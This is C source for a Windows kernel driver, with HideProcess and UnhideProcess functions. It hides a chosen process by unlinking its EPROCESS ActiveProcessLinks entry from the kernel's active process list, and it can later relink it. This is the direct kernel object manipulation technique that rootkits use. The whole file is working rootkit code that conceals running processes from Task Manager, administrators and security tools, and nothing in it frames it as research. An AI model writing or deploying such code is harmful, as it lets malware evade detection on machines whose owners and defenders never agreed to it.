
NTSTATUS
HideProcess(
	_In_ ULONG ProcessId
)
{
	KIRQL LockIrql;

	if (ProcessId == 0 || ProcessId == 4)
		return STATUS_ACCESS_DENIED;

	if (!G_ActiveLinksOffsetFound)
	{
		NTSTATUS S = FindActiveProcessLinksOffset(&G_ActiveProcessLinksOffset);
		if (NT_SUCCESS(S))
		{
			G_ActiveLinksOffsetFound = TRUE;
		}
		else
		{
			LogMessage("HideProcess: cannot find ActiveProcessLinks offset.\n");
			return S;
		}
	}

	PEPROCESS Process;
	NTSTATUS Status = PsLookupProcessByProcessId(ULongToHandle(ProcessId), &Process);
	if (!NT_SUCCESS(Status))
	{
		LogMessage("HideProcess: PID %u not found.\n", ProcessId);
		return Status;
	}

	PHIDDEN_PROCESS_ENTRY Entry = (PHIDDEN_PROCESS_ENTRY)
		ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(HIDDEN_PROCESS_ENTRY), POOL_TAG);
	if (Entry == NULL)
	{
		ObfDereferenceObject(Process);
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	KeAcquireSpinLock(&G_HiddenProcessListLock, &LockIrql);

	{
		PLIST_ENTRY He = G_HiddenProcessListHead.Flink;
		while (He != &G_HiddenProcessListHead)
		{
			PHIDDEN_PROCESS_ENTRY Hpe = CONTAINING_RECORD(He, HIDDEN_PROCESS_ENTRY, ListEntry);
			if (Hpe->ProcessId == ProcessId)
			{
				KeReleaseSpinLock(&G_HiddenProcessListLock, LockIrql);
				ExFreePoolWithTag(Entry, POOL_TAG);
				ObfDereferenceObject(Process);
				LogMessage("HideProcess: PID %u already hidden.\n", ProcessId);
				return STATUS_SUCCESS;
			}
			He = He->Flink;
		}
	}

	PLIST_ENTRY ActiveLinks = (PLIST_ENTRY)((PUCHAR)Process + G_ActiveProcessLinksOffset);

	Entry->ProcessId   = ProcessId;
	Entry->SavedFlink  = ActiveLinks->Flink;
	Entry->SavedBlink  = ActiveLinks->Blink;

	ActiveLinks->Blink->Flink = ActiveLinks->Flink;
	ActiveLinks->Flink->Blink = ActiveLinks->Blink;

	ActiveLinks->Flink = ActiveLinks;
	ActiveLinks->Blink = ActiveLinks;

	InsertTailList(&G_HiddenProcessListHead, &Entry->ListEntry);

	KeReleaseSpinLock(&G_HiddenProcessListLock, LockIrql);
	ObfDereferenceObject(Process);

	LogMessage("PID %u hidden.\n", ProcessId);
	return STATUS_SUCCESS;
}

NTSTATUS
UnhideProcess(
	_In_ ULONG ProcessId
)
{
	KIRQL LockIrql;

	if (!G_ActiveLinksOffsetFound)
	{
		NTSTATUS S = FindActiveProcessLinksOffset(&G_ActiveProcessLinksOffset);
		if (NT_SUCCESS(S))
		{
			G_ActiveLinksOffsetFound = TRUE;
		}
		else
		{
			return S;
		}
	}

	PEPROCESS Process;
	NTSTATUS Status = PsLookupProcessByProcessId(ULongToHandle(ProcessId), &Process);
	if (!NT_SUCCESS(Status))
	{
		LogMessage("UnhideProcess: PID %u not found.\n", ProcessId);
		return Status;
	}

	KeAcquireSpinLock(&G_HiddenProcessListLock, &LockIrql);

	PHIDDEN_PROCESS_ENTRY Found = NULL;
	{
		PLIST_ENTRY He = G_HiddenProcessListHead.Flink;
		while (He != &G_HiddenProcessListHead)
		{
			PHIDDEN_PROCESS_ENTRY Hpe = CONTAINING_RECORD(He, HIDDEN_PROCESS_ENTRY, ListEntry);
			if (Hpe->ProcessId == ProcessId)
			{
				Found = Hpe;
				break;
			}
			He = He->Flink;
		}
	}

	if (Found == NULL)
	{
		KeReleaseSpinLock(&G_HiddenProcessListLock, LockIrql);
		ObfDereferenceObject(Process);
		LogMessage("UnhideProcess: PID %u not found in hidden list.\n", ProcessId);
		return STATUS_NOT_FOUND;
	}

	BOOLEAN CanRestore = TRUE;
	if ((ULONG_PTR)Found->SavedFlink < 0xFFFF000000000000ULL ||
		(ULONG_PTR)Found->SavedBlink < 0xFFFF000000000000ULL)
	{
		CanRestore = FALSE;
	}

	PLIST_ENTRY ActiveLinks = (PLIST_ENTRY)((PUCHAR)Process + G_ActiveProcessLinksOffset);

	if (CanRestore)
	{
		
		ActiveLinks->Flink = Found->SavedFlink;
		ActiveLinks->Blink = Found->SavedBlink;
		Found->SavedFlink->Blink = ActiveLinks;
		Found->SavedBlink->Flink = ActiveLinks;
	}

	RemoveEntryList(&Found->ListEntry);
	ExFreePoolWithTag(Found, POOL_TAG);

	KeReleaseSpinLock(&G_HiddenProcessListLock, LockIrql);

	if (!CanRestore)
	{
		
		PEPROCESS SysProc;
		if (NT_SUCCESS(PsLookupProcessByProcessId(ULongToHandle(4), &SysProc)))
		{
			PLIST_ENTRY SysLinks = (PLIST_ENTRY)((PUCHAR)SysProc + G_ActiveProcessLinksOffset);
			ActiveLinks->Flink = SysLinks->Flink;
			ActiveLinks->Blink = SysLinks;
			SysLinks->Flink->Blink = ActiveLinks;
			SysLinks->Flink = ActiveLinks;
			ObfDereferenceObject(SysProc);
		}
	}

	ObfDereferenceObject(Process);

	LogMessage("PID %u unhidden.\n", ProcessId);
	return STATUS_SUCCESS;
}